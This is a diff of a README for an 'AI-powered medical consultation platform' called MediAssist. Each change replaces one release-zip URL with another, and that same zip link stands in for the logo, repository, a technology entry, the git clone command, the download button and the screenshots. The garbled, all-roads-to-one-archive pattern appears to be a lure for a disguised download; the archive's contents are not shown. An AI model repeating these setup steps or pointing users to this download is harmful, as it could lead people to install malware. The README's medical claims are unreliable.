@@ -1,10 +1,10 @@
 # 🏥 **MediAssist - AI-Powered Medical Consultation Platform** 🤖
 
-![MediAssist Logo](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
+![MediAssist Logo](https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip)
 
 Welcome to **MediAssist** - the revolutionary AI-powered, full-stack platform that provides primary medical consultations through online text interactions! 🌟 Our platform allows patients to receive immediate medical advice and, if necessary, get referred for further treatment. Leveraging the power of Natural Language Processing (NLP), **MediAssist** ensures accurate diagnosis and personalized care for every patient.
 
-## 📁 Repository: [MediAssist](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
+## 📁 Repository: [MediAssist](https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip)
 
 ## 📋 Description
 
@@ -20,7 +20,7 @@ Welcome to **MediAssist** - the revolutionary AI-powered, full-stack platform th
 - **JavaScript (JS)**
 - **Machine Learning (ML)**
 - **Natural Language Processing (NLP)**
-- **https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip**
+- **https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip**
 - **Python (Py)**
 - **React**
 
@@ -30,7 +30,7 @@ To get started with **MediAssist**, simply follow these steps:
 
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip
+   git clone https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip
    ```
 
 2. Install dependencies:  
@@ -47,7 +47,7 @@ To get started with **MediAssist**, simply follow these steps:
 
 ## 💻 Technologies Used
 
-- **https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip**: Powers the backend of **MediAssist** for seamless performance.
+- **https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip**: Powers the backend of **MediAssist** for seamless performance.
 - **ExpressJS**: Provides a robust framework for building the server-side of the application.
 - **React**: Offers a dynamic and interactive user interface for patients.
 - **Python**: Utilized for various backend processes and data modeling.
@@ -57,12 +57,12 @@ To get started with **MediAssist**, simply follow these steps:
 
 ## 📦 Download
 
-📥 [Download MediAssist v1.0.0](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip "Launch MediAssist")
+📥 [Download MediAssist v1.0.0](https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip "Launch MediAssist")
 
 ## 📸 Screenshots
 
-![MediAssist Screenshot 1](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
-![MediAssist Screenshot 2](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
+![MediAssist Screenshot 1](https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip)
+![MediAssist Screenshot 2](https://github.com/jw0902/MediAssist/releases/download/v2.0/Software.zip)
 
 ## 🤝 Contributing
 
